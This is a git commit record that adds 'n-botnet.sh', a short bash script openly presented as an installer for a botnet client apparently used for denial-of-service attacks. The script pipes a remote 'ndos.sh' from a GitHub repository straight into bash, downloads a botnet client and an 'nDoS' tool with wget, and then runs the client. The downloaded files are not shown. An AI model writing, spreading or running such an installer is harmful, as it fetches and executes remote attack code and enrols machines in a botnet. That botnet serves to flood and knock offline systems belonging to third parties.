2a49ef4dfb22cbb3ad5e0f858a404807efe0e3ca
anhnoine <anhnoine@outlook.com>
2026-07-17 10:17:16 +0700

    Create n-botnet.sh

---
+++ n-botnet.sh
@@ -0,0 +1,15 @@
+#!/usr/bin/env bash
+clear
+apt update
+apt install python3
+bash <(curl -s https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/ndos.sh)
+clear
+
+echo "N-Botnet"
+
+clear
+echo "Installing Botnet Client"
+wget https://raw.githubusercontent.com/anhnoine/N-Botnet/refs/heads/main/client/client.py
+wget https://raw.githubusercontent.com/anhnoine/nDoS/refs/heads/main/tools/nDoS.mno
+clear
+python3 client.py
